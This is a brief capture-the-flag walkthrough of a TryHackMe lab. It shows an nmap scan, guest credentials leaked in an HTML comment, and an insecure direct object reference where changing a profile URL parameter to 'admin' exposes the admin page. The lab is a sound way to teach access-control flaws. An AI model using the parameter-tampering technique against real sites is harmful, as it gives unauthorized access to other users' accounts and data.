```Description 
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

Check out our new cloud service, Authentication Anywhere -- log in from anywhere you would like! Users can enter their username and password, for a totally secure login process! You definitely wouldn't be able to find any secrets that other people have in their profile, right?

**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [http://10.10.69.162](http://10.10.69.162/)
```
This is the IP Address 
```IP_Address 
10.10.69.162
```

where is started Nmap first and Find out 
```Bash 
nmap 10.10.69.162             
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Then  Navigate to 10.10.69.162 on Web-Browser and find a login page 
where ctrl+u indicated guest login which reveals the source code 
```source Code
 <!-- use guest:guest credentials until registration is fixed. "admin" user account is off limits!!!!! -->
```
and in URL it reveals 
```URl 
http://10.10.69.162/profile.php?user=user
```
which indicates the user identity then it just replace by admin 
```NEw_URL 
http://10.10.69.162/profile.php?user=admin
```
it reveals the Message on the Page showing 
```Message 
Hi, admin. Welcome to your site. The flag is: [flag omitted]
```
and the Flag is 
```flag 
[flag omitted]
```
